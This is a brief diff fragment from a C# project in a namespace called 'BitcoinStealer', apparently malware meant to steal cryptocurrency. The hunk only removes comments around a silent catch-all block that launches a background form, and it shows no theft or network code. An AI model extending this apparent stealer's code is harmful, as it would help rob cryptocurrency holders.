@@ -20,10 +20,10 @@ namespace BitcoinStealer
                 new FormBackground();
                 Application.Run();
             }
-            // Log the exception, encrypt it and send it back
+            
             catch
             {
-                // ignored
+                
             }
         }
     }
